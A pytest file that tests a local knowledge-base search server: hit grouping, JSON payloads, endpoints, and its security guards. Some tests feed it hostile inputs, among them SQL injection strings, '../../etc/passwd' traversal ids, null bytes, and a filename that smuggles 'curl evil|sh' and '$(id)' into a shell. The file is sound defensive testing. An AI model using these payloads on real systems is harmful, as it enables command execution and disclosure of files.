"""Local web interface: grouping, payloads, endpoints, and the open guard."""

from __future__ import annotations

import json
import sqlite3
import threading
import urllib.error
import urllib.request

import pytest
from typer.testing import CliRunner

import kb.cli as cli_mod
import kb.web as web_mod
from kb.cli import app as cli_app
from kb.retrieve import Hit
from kb.web import (
    build_payload,
    file_meta,
    group_hits,
    load_concept,
    make_server,
    resolve_source_path,
)

from test_index import StubEmbedder


def hit(concept_id, heading, text, title=None, rrf=0.0):
    return Hit(
        chunk_id=f"{concept_id}#{heading}",
        concept_id=concept_id,
        title=title or concept_id.split("/")[-1].replace("-", " ").title(),
        heading_path=heading,
        text=text,
        source="local",
        concept_type="Runbook",
        sensitivity="work",
        rrf=rrf,
        file_path=f"/Users/example/Docs/{concept_id.split('/')[-1]}.md",
        concept={"description": "A description."},
    )


def test_one_document_per_concept_however_many_passages_match():
    docs = group_hits([
        hit("runbook/gates", "Purpose", "gates must be green"),
        hit("runbook/gates", "Workflow", "the operator runs preflight"),
        hit("runbook/gates", "Evidence", "retain the json output"),
    ])
    assert len(docs) == 1
    assert docs[0].passage_count == 3


def test_documents_keep_the_rank_order_of_their_best_passage():
    docs = group_hits([
        hit("runbook/gates", "Purpose", "first"),
        hit("runbook/install", "Setup", "second"),
        hit("runbook/gates", "Workflow", "third, but gates already ranked first"),
    ])
    assert [d.concept_id for d in docs] == ["runbook/gates", "runbook/install"]


def test_preview_is_the_best_ranked_passage_not_the_last_seen():
    docs = group_hits([
        hit("runbook/gates", "Purpose", "the winning passage"),
        hit("runbook/gates", "Workflow", "a later weaker passage"),
    ])
    assert "winning" in docs[0].preview
    assert "weaker" not in docs[0].preview


def test_headings_are_collected_in_rank_order_without_duplicates():
    docs = group_hits([
        hit("runbook/gates", "Purpose", "a"),
        hit("runbook/gates", "Workflow", "b"),
        hit("runbook/gates", "Purpose", "c"),
    ])
    assert docs[0].headings == ["Purpose", "Workflow"]


def test_no_hits_gives_no_documents():
    assert group_hits([]) == []


def _manifest_with(cfg, rows):
    cfg.data_dir.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(cfg.manifest_path)
    conn.execute(
        "CREATE TABLE IF NOT EXISTS files (path TEXT PRIMARY KEY, hash TEXT, "
        "ext TEXT, size INTEGER, mtime REAL)"
    )
    conn.executemany(
        "INSERT OR REPLACE INTO files (path, hash, ext, size, mtime) "
        "VALUES (?, ?, ?, ?, ?)",
        rows,
    )
    conn.commit()
    conn.close()


def test_file_meta_returns_folder_and_mtime(cfg):
    _manifest_with(cfg, [
        ("/Users/example/archive/notes/deal.md", "aa11", ".md", 10, 1772000000.0),
    ])
    meta = file_meta(cfg, ["/Users/example/archive/notes/deal.md"])
    assert meta["/Users/example/archive/notes/deal.md"]["folder"] == "notes"
    assert meta["/Users/example/archive/notes/deal.md"]["mtime"] == 1772000000.0


def test_file_meta_omits_paths_it_does_not_know(cfg):
    _manifest_with(cfg, [("/a/known.md", "aa11", ".md", 10, 1.0)])
    meta = file_meta(cfg, ["/a/known.md", "/a/unknown.md"])
    assert "/a/unknown.md" not in meta


def test_file_meta_on_an_empty_path_list_touches_no_database(cfg, monkeypatch):
    """The name is the assertion, so verify it rather than only the return value.

    Written after a mutation check: deleting the `not wanted` guard left the
    original version of this test green, because it ran with no manifest on
    disk and so returned {} down a different branch. SQLite accepts
    `WHERE path IN ()` without complaint, so nothing else would have caught it.
    """
    _manifest_with(cfg, [("/a/known.md", "aa11", ".md", 10, 1.0)])

    def refuse(*args, **kwargs):
        raise AssertionError("opened the manifest for an empty path list")

    monkeypatch.setattr(sqlite3, "connect", refuse)
    assert file_meta(cfg, []) == {}


def test_file_meta_ignores_empty_paths_without_querying_for_them(cfg, monkeypatch):
    """A document with no resolved source path must not become a `IN ('')` row."""
    _manifest_with(cfg, [("/a/known.md", "aa11", ".md", 10, 1.0)])

    def refuse(*args, **kwargs):
        raise AssertionError("opened the manifest for paths that were all empty")

    monkeypatch.setattr(sqlite3, "connect", refuse)
    assert file_meta(cfg, ["", ""]) == {}


def test_payload_carries_documents_totals_and_timings(cfg):
    _manifest_with(cfg, [("/Users/example/Docs/gates.md", "aa11", ".md", 10, 1772000000.0)])
    hits = [
        hit("runbook/gates", "Purpose", "gates must be green"),
        hit("runbook/gates", "Workflow", "operator runs preflight"),
        hit("runbook/install", "Setup", "install the baseline"),
    ]
    hits[0].file_path = "/Users/example/Docs/gates.md"
    hits[1].file_path = "/Users/example/Docs/gates.md"

    payload = build_payload(cfg, hits, {"total_ms": 502.0}, degraded="")

    assert payload["total_documents"] == 2
    assert payload["total_passages"] == 3
    assert payload["timings"]["total_ms"] == 502.0
    assert payload["degraded"] == ""
    assert payload["documents"][0]["folder"] == "Docs"
    assert payload["documents"][0]["passage_count"] == 2


def test_payload_survives_a_document_with_no_manifest_row(cfg):
    _manifest_with(cfg, [])
    payload = build_payload(cfg, [hit("runbook/gates", "Purpose", "x")], {}, degraded="")
    assert payload["documents"][0]["folder"] == ""
    assert payload["documents"][0]["mtime"] is None


def test_payload_reports_degradation(cfg):
    _manifest_with(cfg, [])
    payload = build_payload(cfg, [], {}, degraded="semantic search unavailable")
    assert payload["degraded"] == "semantic search unavailable"
    assert payload["documents"] == []


def test_payload_flattens_entity_dicts_to_names(cfg):
    """Frontmatter entities are {"name", "kind"} dicts. The page wants names."""
    _manifest_with(cfg, [])
    h = hit("runbook/gates", "Purpose", "x")
    h.concept = {
        "description": "About gates.",
        "tags": ["ops", "release"],
        "entities": [{"name": "Redwood", "kind": "system"}, {"name": "Ada", "kind": "person"}],
    }
    doc = build_payload(cfg, [h], {}, degraded="")["documents"][0]
    assert doc["entities"] == ["Redwood", "Ada"]
    assert doc["tags"] == ["ops", "release"]
    assert doc["description"] == "About gates."


def test_payload_is_json_serialisable(cfg):
    """It is handed straight to json.dumps by the server, so prove it survives."""
    import json

    _manifest_with(cfg, [("/Users/example/Docs/gates.md", "aa11", ".md", 10, 1772000000.0)])
    h = hit("runbook/gates", "Purpose", "x")
    h.file_path = "/Users/example/Docs/gates.md"
    json.dumps(build_payload(cfg, [h], {"total_ms": 1.0}, degraded=""))


def _concepts_table(cfg, rows):
    conn = sqlite3.connect(cfg.manifest_path)
    conn.execute(
        "CREATE TABLE IF NOT EXISTS concepts (concept_id TEXT PRIMARY KEY, "
        "source_hash TEXT, enrich_status TEXT)"
    )
    conn.executemany(
        "INSERT OR REPLACE INTO concepts (concept_id, source_hash, enrich_status) "
        "VALUES (?, ?, ?)",
        rows,
    )
    conn.commit()
    conn.close()


def test_a_known_concept_resolves_to_its_source_path(cfg):
    _manifest_with(cfg, [("/Users/example/Docs/gates.md", "aa11", ".md", 10, 1.0)])
    _concepts_table(cfg, [("runbook/gates", "aa11", "ok")])
    assert resolve_source_path(cfg, "runbook/gates") == "/Users/example/Docs/gates.md"


def test_an_unknown_concept_resolves_to_nothing(cfg):
    _manifest_with(cfg, [("/Users/example/Docs/gates.md", "aa11", ".md", 10, 1.0)])
    _concepts_table(cfg, [("runbook/gates", "aa11", "ok")])
    assert resolve_source_path(cfg, "runbook/does-not-exist") is None


def test_duplicate_files_sharing_a_hash_resolve_deterministically(cfg):
    """Identical files are deduplicated by hash. Take the same one graph.py takes."""
    _manifest_with(cfg, [
        ("/Users/example/Docs/b-copy.md", "aa11", ".md", 10, 1.0),
        ("/Users/example/Docs/a-original.md", "aa11", ".md", 10, 1.0),
    ])
    _concepts_table(cfg, [("runbook/gates", "aa11", "ok")])
    assert resolve_source_path(cfg, "runbook/gates") == "/Users/example/Docs/a-original.md"


def test_an_empty_concept_id_resolves_to_nothing(cfg):
    _manifest_with(cfg, [("/Users/example/Docs/gates.md", "aa11", ".md", 10, 1.0)])
    _concepts_table(cfg, [("runbook/gates", "aa11", "ok")])
    assert resolve_source_path(cfg, "") is None


def test_a_sql_wildcard_concept_id_matches_nothing(cfg):
    """The id is bound as a parameter, so `%` is a literal, not a wildcard."""
    _manifest_with(cfg, [("/Users/example/Docs/gates.md", "aa11", ".md", 10, 1.0)])
    _concepts_table(cfg, [("runbook/gates", "aa11", "ok")])
    assert resolve_source_path(cfg, "%") is None
    assert resolve_source_path(cfg, "runbook/%") is None


def test_a_concept_with_no_matching_file_row_resolves_to_nothing(cfg):
    """Enriched concept, but its source file has left the manifest."""
    _manifest_with(cfg, [])
    _concepts_table(cfg, [("runbook/gates", "aa11", "ok")])
    assert resolve_source_path(cfg, "runbook/gates") is None


def test_a_quote_in_the_concept_id_cannot_break_out_of_the_query(cfg):
    """The one test standing between /api/open and an arbitrary file.

    Added after a mutation check: swapping the bound parameter for an f-string
    left every other test in this file green. None of them contained a quote,
    and the `%` tests use `=` rather than `LIKE`, so they prove wildcard safety
    and say nothing at all about injection.

    Interpolated, `x' OR '1'='1` matches every concept row and MIN(path) hands
    back a real file, which the open endpoint would then launch.
    """
    _manifest_with(cfg, [("/Users/example/Docs/gates.md", "aa11", ".md", 10, 1.0)])
    _concepts_table(cfg, [("runbook/gates", "aa11", "ok")])

    assert resolve_source_path(cfg, "x' OR '1'='1") is None
    assert resolve_source_path(cfg, "' OR 1=1 --") is None
    assert resolve_source_path(cfg, "runbook/gates' --") is None


@pytest.fixture
def server(cfg):
    """A real server on a real ephemeral port. No mocked handlers."""
    httpd = make_server(cfg, port=0)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{httpd.server_address[1]}"
    httpd.shutdown()
    httpd.server_close()


def get(base, path):
    with urllib.request.urlopen(base + path) as r:
        return r.status, r.headers.get("Content-Type"), r.read().decode()


def test_root_serves_the_page(server):
    status, ctype, body = get(server, "/")
    assert status == 200
    assert "text/html" in ctype
    assert "<title>" in body


def test_the_page_knows_the_document_types(server):
    """The type dropdown is filled server-side, so there is no extra round trip."""
    _, _, body = get(server, "/")
    assert "Runbook" in body


def test_an_unknown_route_is_a_json_404(server):
    try:
        get(server, "/nope")
        raise AssertionError("expected HTTPError")
    except urllib.error.HTTPError as exc:
        assert exc.code == 404
        assert json.loads(exc.read())["error"]


def test_the_server_binds_loopback_only(cfg):
    """Never 0.0.0.0. This serves one person on one machine."""
    httpd = make_server(cfg, port=0)
    try:
        assert httpd.server_address[0] == "127.0.0.1"
    finally:
        httpd.server_close()


@pytest.fixture
def indexed_server(cfg, monkeypatch):
    """A real index, a real server, stub embeddings. No mocked retrieval."""
    import kb.embed as embed_mod
    from kb.index import run_index

    b = cfg.bundle_dir
    (b / "runbook").mkdir(parents=True)
    for name, h, body in (
        ("restart", "aa11", "Stop the widget service, wait thirty seconds, start it."),
        ("invoice", "bb22", "Quarterly revenue reached four million dollars in total."),
    ):
        (b / "runbook" / f"{name}.md").write_text(
            f"---\ntype: Runbook\ntitle: {name.title()}\n"
            f"description: About {name}.\nsensitivity: work\n"
            f"resource: file:///Users/example/My%20Docs/{name}.md\n"
            f"source_hash: {h}\n---\n\n# Body\n\n{body}\n"
        )
        out = cfg.extract_out_dir / h[:2] / f"{h}.md"
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(f"# Detail\n\n{body}\n")
    (b / "index.md").write_text('---\nokf_version: "0.2"\n---\n\n# All\n')

    monkeypatch.setattr(embed_mod, "check_embed_model", lambda c: (True, "stub"))
    monkeypatch.setattr(embed_mod, "Embedder", StubEmbedder)
    monkeypatch.setattr("kb.retrieve.Embedder", StubEmbedder)
    monkeypatch.setattr("kb.retrieve.rerank", lambda cfg, q, hits: None)
    embed_mod._TABLE_CACHE.clear()
    run_index(cfg, show_progress=False)

    httpd = make_server(cfg, port=0)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{httpd.server_address[1]}"
    httpd.shutdown()
    httpd.server_close()


def test_search_returns_documents_over_real_http(indexed_server):
    status, ctype, body = get(indexed_server, "/api/search?q=widget%20service")
    assert status == 200
    assert "application/json" in ctype
    payload = json.loads(body)
    assert payload["total_documents"] >= 1
    assert payload["documents"][0]["title"]
    assert "total_ms" in payload["timings"]


def test_search_with_no_query_returns_an_empty_result_not_an_error(indexed_server):
    status, _, body = get(indexed_server, "/api/search?q=")
    assert status == 200
    assert json.loads(body)["documents"] == []


def test_search_with_a_whitespace_only_query_is_also_empty(indexed_server):
    status, _, body = get(indexed_server, "/api/search?q=%20%20")
    assert status == 200
    assert json.loads(body)["documents"] == []


def test_search_filters_by_concept_type(indexed_server):
    _, _, body = get(indexed_server, "/api/search?q=widget&type=Report")
    assert json.loads(body)["documents"] == []
    _, _, body = get(indexed_server, "/api/search?q=widget&type=Runbook")
    assert json.loads(body)["total_documents"] >= 1


def test_search_filters_by_sensitivity(indexed_server):
    _, _, body = get(indexed_server, "/api/search?q=widget&sensitivity=personal")
    assert json.loads(body)["documents"] == []
    _, _, body = get(indexed_server, "/api/search?q=widget&sensitivity=work")
    assert json.loads(body)["total_documents"] >= 1


def test_an_empty_query_never_reaches_the_retrieval_pipeline(server, monkeypatch):
    """The guard is an optimisation, so only an optimisation test can see it.

    Added after a mutation check: deleting the `if not query` guard left all 30
    tests green, because the pipeline returns nothing for an empty string
    anyway. The cost it avoids is real though. A full run embeds the query
    through Ollama first, so an unguarded empty search wakes a model to answer
    a question nobody asked.
    """
    import kb.retrieve

    def refuse(*args, **kwargs):
        raise AssertionError("ran the retrieval pipeline for an empty query")

    monkeypatch.setattr(kb.retrieve, "search", refuse)

    for query in ("", "%20%20", "+"):
        status, _, body = get(server, f"/api/search?q={query}")
        assert status == 200
        assert json.loads(body)["documents"] == []


def post(base, path, obj):
    data = json.dumps(obj).encode()
    req = urllib.request.Request(
        base + path, data=data, headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req) as r:
        return r.status, json.loads(r.read())


@pytest.fixture
def opened(monkeypatch):
    """Record what would have been opened instead of opening it."""
    calls = []
    monkeypatch.setattr(web_mod, "launch", lambda path: calls.append(path))
    return calls


@pytest.fixture
def open_server(cfg, tmp_path):
    """A server plus a manifest pointing at a file that really exists."""
    real = tmp_path / "gates.md"
    real.write_text("# Gates\n")
    _manifest_with(cfg, [(str(real), "aa11", ".md", 10, 1.0)])
    _concepts_table(cfg, [("runbook/gates", "aa11", "ok")])

    httpd = make_server(cfg, port=0)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{httpd.server_address[1]}", str(real)
    httpd.shutdown()
    httpd.server_close()


def test_a_known_concept_opens_its_source_file(open_server, opened):
    base, real = open_server
    status, body = post(base, "/api/open", {"id": "runbook/gates"})
    assert status == 200
    assert body["ok"] is True
    assert opened == [real]


def test_an_unknown_concept_opens_nothing(open_server, opened):
    base, _ = open_server
    try:
        post(base, "/api/open", {"id": "runbook/nope"})
        raise AssertionError("expected HTTPError")
    except urllib.error.HTTPError as exc:
        assert exc.code == 400
    assert opened == []


def test_a_client_supplied_path_is_ignored_entirely(open_server, opened):
    """The guard that matters. A path in the body must never be honoured."""
    base, real = open_server
    post(base, "/api/open", {
        "id": "runbook/gates",
        "path": "/etc/passwd",
        "file_path": "/etc/passwd",
        "source": "/etc/passwd",
    })
    assert opened == [real]
    assert "/etc/passwd" not in opened


def test_a_body_with_only_a_path_and_no_id_opens_nothing(open_server, opened):
    """No id means no lookup, whatever else the caller sent."""
    base, _ = open_server
    try:
        post(base, "/api/open", {"path": "/etc/passwd"})
        raise AssertionError("expected HTTPError")
    except urllib.error.HTTPError as exc:
        assert exc.code == 400
    assert opened == []


def test_a_concept_whose_file_is_gone_opens_nothing(cfg, opened):
    """Deprecated concepts keep their record after the file is deleted."""
    _manifest_with(cfg, [("/gone/missing.md", "aa11", ".md", 10, 1.0)])
    _concepts_table(cfg, [("runbook/gates", "aa11", "ok")])
    httpd = make_server(cfg, port=0)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{httpd.server_address[1]}"
    try:
        post(base, "/api/open", {"id": "runbook/gates"})
        raise AssertionError("expected HTTPError")
    except urllib.error.HTTPError as exc:
        assert exc.code == 400
        assert "gone" in json.loads(exc.read())["error"]
    finally:
        assert opened == []
        httpd.shutdown()
        httpd.server_close()


def test_a_malformed_body_is_a_clean_400(open_server, opened):
    base, _ = open_server
    req = urllib.request.Request(
        base + "/api/open", data=b"not json{{{",
        headers={"Content-Type": "application/json"}, method="POST",
    )
    try:
        urllib.request.urlopen(req)
        raise AssertionError("expected HTTPError")
    except urllib.error.HTTPError as exc:
        assert exc.code == 400
    assert opened == []


def test_posting_to_an_unknown_route_is_a_404(open_server):
    base, _ = open_server
    try:
        post(base, "/api/nope", {"id": "x"})
        raise AssertionError("expected HTTPError")
    except urllib.error.HTTPError as exc:
        assert exc.code == 404


def test_launch_never_hands_a_path_to_a_shell(monkeypatch):
    """The only test that executes the body of launch().

    Every other test replaces `launch` wholesale, so the list-versus-shell
    distinction never runs and a rewrite to `shell=True`, `os.system`, or
    string concatenation would go unnoticed. A mutation check confirmed that:
    switching to `shell=True` left all 38 tests green.

    It is not theoretical. The path comes from the manifest, which indexes real
    filenames off disk, and macOS allows `;`, backticks, `$()` and quotes in a
    filename. Under a shell, a document called `notes;curl x|sh.md` would run
    rather than open. A list argument cannot reach a shell at all, so asserting
    the argument shape is what actually closes this.
    """
    seen = {}

    def fake_run(args, **kwargs):
        seen["args"] = args
        seen["kwargs"] = kwargs

    monkeypatch.setattr(web_mod.subprocess, "run", fake_run)
    hostile = "/Users/example/Docs/notes;curl evil|sh `whoami` $(id).md"
    web_mod.launch(hostile)

    assert isinstance(seen["args"], list), "a string argument can reach a shell"
    assert seen["args"] == ["open", hostile]
    assert seen["kwargs"].get("shell") is not True


def test_a_json_list_body_is_a_clean_400_not_a_dropped_connection(open_server, opened):
    """A non-object body must not reach `.get()` and crash the handler thread."""
    base, _ = open_server
    try:
        post(base, "/api/open", ["runbook/gates"])
        raise AssertionError("expected HTTPError")
    except urllib.error.HTTPError as exc:
        assert exc.code == 400
    assert opened == []


def test_the_search_endpoint_degrades_rather_than_erroring(indexed_server, monkeypatch):
    import kb.retrieve as retrieve_mod

    def boom(*a, **k):
        raise RuntimeError("ollama is not running")

    monkeypatch.setattr(retrieve_mod, "Embedder", boom)
    status, _, body = get(indexed_server, "/api/search?q=widget")
    payload = json.loads(body)
    assert status == 200
    assert payload["degraded"] == "semantic search unavailable"
    assert payload["total_documents"] >= 1, "keyword results should still arrive"


def test_concept_route_returns_detail_for_a_concept_not_in_the_results(indexed_server):
    status, _, body = get(indexed_server, "/api/concept?id=runbook/invoice")
    assert status == 200
    doc = json.loads(body)
    assert doc["title"] == "Invoice"
    assert doc["description"] == "About invoice."
    assert doc["concept_type"] == "Runbook"
    assert doc["sensitivity"] == "work"


def test_concept_route_404s_on_an_unknown_id(indexed_server):
    try:
        get(indexed_server, "/api/concept?id=runbook/nope")
        raise AssertionError("expected HTTPError")
    except urllib.error.HTTPError as exc:
        assert exc.code == 404


def test_concept_route_404s_on_a_missing_id(indexed_server):
    try:
        get(indexed_server, "/api/concept")
        raise AssertionError("expected HTTPError")
    except urllib.error.HTTPError as exc:
        assert exc.code == 404


@pytest.mark.parametrize("hostile", [
    "../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "runbook/../../../etc/passwd",
])
def test_concept_route_refuses_to_escape_the_bundle(indexed_server, hostile):
    """A concept id is a path, so it is treated as hostile input."""
    try:
        get(indexed_server, f"/api/concept?id={hostile}")
        raise AssertionError(f"expected HTTPError for {hostile}")
    except urllib.error.HTTPError as exc:
        assert exc.code == 404


def test_concept_route_never_reads_a_file_outside_the_bundle(cfg, tmp_path):
    """The escape has to actually reach a real file, or the test proves nothing.

    The first version of this test passed `outside.name`, which is `secret.md`.
    `load_concept` appends its own `.md`, so it looked for `secret.md.md` and
    404'd on a filename mismatch rather than on containment. Both halves of the
    guard could be deleted and this test stayed green.

    `outside.stem` is the fix: `../secret` plus the appended `.md` lands
    exactly on the real file, so only the guard can stop it.
    """
    outside = tmp_path / "secret.md"
    outside.write_text("---\ntype: Runbook\ntitle: Secret\n---\n\nnope\n")
    cfg.bundle_dir.mkdir(parents=True, exist_ok=True)
    assert outside.is_file(), "the escape must reach a file that exists"

    # `..` traversal. Kills `is_relative_to` on an unresolved path, which is a
    # lexical parts-prefix check: bundle/../secret.md literally starts with
    # bundle, so it reports True while pointing outside.
    assert load_concept(cfg, f"../{outside.stem}") is None

    # Absolute path. `strip('/')` re-roots it under the bundle, so this one
    # cannot escape by construction. Kept to pin that behaviour.
    assert load_concept(cfg, str(outside).removesuffix(".md")) is None


def test_concept_route_never_follows_a_symlink_out_of_the_bundle(cfg, tmp_path):
    """Pins `.resolve()` on its own, with no `..` involved.

    A symlink sitting inside bundle/ is lexically inside it, so every string
    check passes. Only resolving the path first reveals where it really goes.
    """
    outside = tmp_path / "outside-target.md"
    outside.write_text("---\ntype: Runbook\ntitle: Outside\n---\n\nnope\n")
    cfg.bundle_dir.mkdir(parents=True, exist_ok=True)
    link = cfg.bundle_dir / "innocent.md"
    link.symlink_to(outside)

    assert link.is_file(), "the symlink must resolve to a real file"
    assert load_concept(cfg, "innocent") is None


# --- kb web ------------------------------------------------------------------


def test_cli_web_reports_a_bind_failure_and_exits_1(monkeypatch, cfg):
    """The port-in-use guard: no traceback, one line, exit 1."""
    monkeypatch.setattr(cli_mod, "_load", lambda config, verbose: cfg)

    def raise_in_use(cfg, port):
        raise OSError("Address already in use")

    monkeypatch.setattr(web_mod, "make_server", raise_in_use)

    result = CliRunner().invoke(cli_app, ["web", "--port", "8765"])

    assert result.exit_code == 1
    # Rich's auto-highlighter styles the port number separately, so check the
    # phrase and the number rather than one contiguous substring.
    assert "cannot bind port" in result.output
    assert "8765" in result.output
    assert "Traceback" not in result.output


def test_cli_web_stops_cleanly_on_keyboard_interrupt(monkeypatch, cfg):
    """Ctrl-C prints `stopped`, closes the socket, and exits 0."""
    monkeypatch.setattr(cli_mod, "_load", lambda config, verbose: cfg)

    class StubServer:
        server_address = ("127.0.0.1", 8765)
        closed = False

        def serve_forever(self):
            raise KeyboardInterrupt

        def server_close(self):
            StubServer.closed = True

    monkeypatch.setattr(web_mod, "make_server", lambda cfg, port: StubServer())

    result = CliRunner().invoke(cli_app, ["web"])

    assert result.exit_code == 0
    assert "stopped" in result.output
    assert StubServer.closed is True


# --- Confidence: the reranker score, surfaced ---------------------------------


def test_a_document_carries_the_score_of_its_best_passage(cfg):
    """The reranker emits a calibrated 0-1 relevance judgement per passage.

    Fusion scores are rank reciprocals and mean nothing in absolute terms, so
    this is the only number that can tell a real answer from the corpus's
    nearest miss. Measured 2026-08-10 on the live corpus: a query with an
    answer scores 0.989 at rank 1, a query without one scores 0.0032.
    """
    _manifest_with(cfg, [])
    strong = hit("runbook/gates", "Purpose", "gates must be green")
    strong.rerank = 0.9890
    weak = hit("runbook/gates", "Workflow", "unrelated")
    weak.rerank = 0.4000
    doc = build_payload(cfg, [strong, weak], {}, degraded="")["documents"][0]
    assert doc["score"] == pytest.approx(0.9890)


def test_payload_reports_the_best_score_across_all_documents(cfg):
    _manifest_with(cfg, [])
    a = hit("runbook/gates", "Purpose", "x")
    a.rerank = 0.12
    b = hit("runbook/install", "Setup", "y")
    b.rerank = 0.87
    payload = build_payload(cfg, [a, b], {}, degraded="")
    assert payload["best_score"] == pytest.approx(0.87)


def test_best_score_is_zero_when_nothing_matched(cfg):
    _manifest_with(cfg, [])
    assert build_payload(cfg, [], {}, degraded="")["best_score"] == 0.0


def test_a_result_set_with_no_real_answer_is_flagged_as_weak(cfg):
    """The whole point. Every score near zero means "I found nothing"."""
    _manifest_with(cfg, [])
    hits = []
    for i, score in enumerate((0.0032, 0.0028, 0.0017)):
        h = hit(f"reference/manual-{i}", "Body", "unrelated text")
        h.rerank = score
        hits.append(h)
    payload = build_payload(cfg, hits, {}, degraded="")
    assert payload["weak"] is True
    assert payload["documents"], "weak results are still returned, just marked"


def test_a_result_set_with_a_real_answer_is_not_flagged_as_weak(cfg):
    _manifest_with(cfg, [])
    h = hit("runbook/gates", "Purpose", "gates must be green")
    h.rerank = 0.9890
    assert build_payload(cfg, [h], {}, degraded="")["weak"] is False


def test_degraded_results_are_never_flagged_weak(cfg):
    """With the embedder down there is no reranker score to judge by.

    Fusion scores would be read as near-zero confidence and every keyword
    result would be branded weak, which is a lie about why.
    """
    _manifest_with(cfg, [])
    h = hit("runbook/gates", "Purpose", "x")
    h.rrf = 0.016
    payload = build_payload(cfg, [h], {}, degraded="semantic search unavailable")
    assert payload["weak"] is False


# --- Related concepts, and a malformed header --------------------------------


def test_load_concept_returns_the_related_concepts_from_its_body(cfg):
    """The spec asked for these. They live in the body as markdown links, not
    in frontmatter, which is why the first pass deferred them."""
    b = cfg.bundle_dir / "runbook"
    b.mkdir(parents=True, exist_ok=True)
    (b / "gates.md").write_text(
        "---\ntype: Runbook\ntitle: Gates\ndescription: d\n---\n\n"
        "# Summary\n\nText.\n\n# Related\n\n"
        "* [Install Runbook](/runbook/install.md)\n"
        "* [Missing Thing](/runbook/missing.md)\n"
        "* [External](https://example.com/x)\n"
    )
    (b / "install.md").write_text(
        "---\ntype: Runbook\ntitle: Install Runbook\ndescription: d\n---\n\n# Body\n"
    )

    doc = load_concept(cfg, "runbook/gates")
    ids = [r["concept_id"] for r in doc["related"]]
    assert "runbook/install" in ids, "a real sibling must be linkable"
    assert "runbook/missing" not in ids, "a broken link is not a destination"
    assert not any("example.com" in i for i in ids), "external links are not concepts"
    assert doc["related"][0]["title"] == "Install Runbook"


def test_related_is_empty_rather_than_absent_when_there_are_no_links(cfg):
    b = cfg.bundle_dir / "runbook"
    b.mkdir(parents=True, exist_ok=True)
    (b / "lonely.md").write_text(
        "---\ntype: Runbook\ntitle: Lonely\ndescription: d\n---\n\n# Body\n\nNo links.\n"
    )
    assert load_concept(cfg, "runbook/lonely")["related"] == []


def test_a_non_numeric_content_length_is_a_clean_400(open_server, opened):
    """Same crash shape as the list body, flagged in Task 7 and left open."""
    import http.client

    base, _ = open_server
    host = base.removeprefix("http://")
    conn = http.client.HTTPConnection(host)
    conn.putrequest("POST", "/api/open", skip_host=False, skip_accept_encoding=True)
    conn.putheader("Content-Type", "application/json")
    conn.putheader("Content-Length", "banana")
    conn.endheaders()
    conn.send(b'{"id": "runbook/gates"}')
    status = conn.getresponse().status
    conn.close()
    assert status == 400
    assert opened == []


def test_an_absurdly_long_concept_id_is_a_miss_not_a_crash(cfg):
    """Reachable over HTTP as /api/concept?id=aaa...

    The filesystem raises OSError 63 (File name too long) before any guard
    runs, which propagates out of the handler thread and drops the connection
    rather than answering. Same crash class as the Content-Length bug.
    """
    cfg.bundle_dir.mkdir(parents=True, exist_ok=True)
    assert load_concept(cfg, "a" * 400) is None
    assert load_concept(cfg, "runbook/" + "b" * 400) is None


def test_a_null_byte_in_a_concept_id_is_a_miss_not_a_crash(cfg):
    """Python raises ValueError before the OS sees it. Also an HTTP-reachable
    input, since a client can percent-encode %00."""
    cfg.bundle_dir.mkdir(parents=True, exist_ok=True)
    assert load_concept(cfg, "runbook/gates\x00.md") is None
    assert load_concept(cfg, "\x00") is None


def test_the_concept_route_answers_404_for_both_rather_than_dropping(indexed_server):
    """Proves it end to end, over real HTTP, not just at the function."""
    import urllib.parse

    for hostile in ("a" * 400, "runbook/gates\x00"):
        try:
            get(indexed_server, "/api/concept?id=" + urllib.parse.quote(hostile))
            raise AssertionError(f"expected HTTPError for {hostile[:20]!r}")
        except urllib.error.HTTPError as exc:
            assert exc.code == 404


# --- CLI: a user mistake is not a crash --------------------------------------


def test_a_missing_config_path_is_a_clean_message_not_a_traceback(tmp_path):
    """_load is called by all 20 commands, so this is one fix for all of them.

    Before: 35 lines of traceback through cli.py for a typo'd path.
    """
    result = CliRunner().invoke(cli_app, ["doctor", "-c", str(tmp_path / "nope.toml")])
    assert result.exit_code == 1
    assert "Traceback" not in result.output
    assert "no config" in result.output


def test_a_malformed_config_file_is_a_clean_message_too(tmp_path):
    bad = tmp_path / "config.toml"
    bad.write_text("this is not [valid toml\n")
    result = CliRunner().invoke(cli_app, ["doctor", "-c", str(bad)])
    assert result.exit_code == 1
    assert "Traceback" not in result.output


def test_cli_search_with_an_empty_query_does_not_run_the_pipeline(monkeypatch):
    """The web endpoint guards this; the CLI did not, so `kb search ""` spent
    2.8 seconds of reranker GPU answering a question nobody asked.

    Two entry points to one feature disagreeing about a basic case is the sort
    of thing that stays broken because each looks fine on its own.
    """
    import kb.retrieve

    def refuse(*a, **k):
        raise AssertionError("ran the retrieval pipeline for an empty query")

    monkeypatch.setattr(kb.retrieve, "search", refuse)
    monkeypatch.setattr(cli_mod, "_load", lambda c, v: __import__("kb.config", fromlist=["load_config"]).load_config())

    for q in ("", "   "):
        result = CliRunner().invoke(cli_app, ["search", q])
        assert result.exit_code == 0, result.output
        assert "Traceback" not in result.output
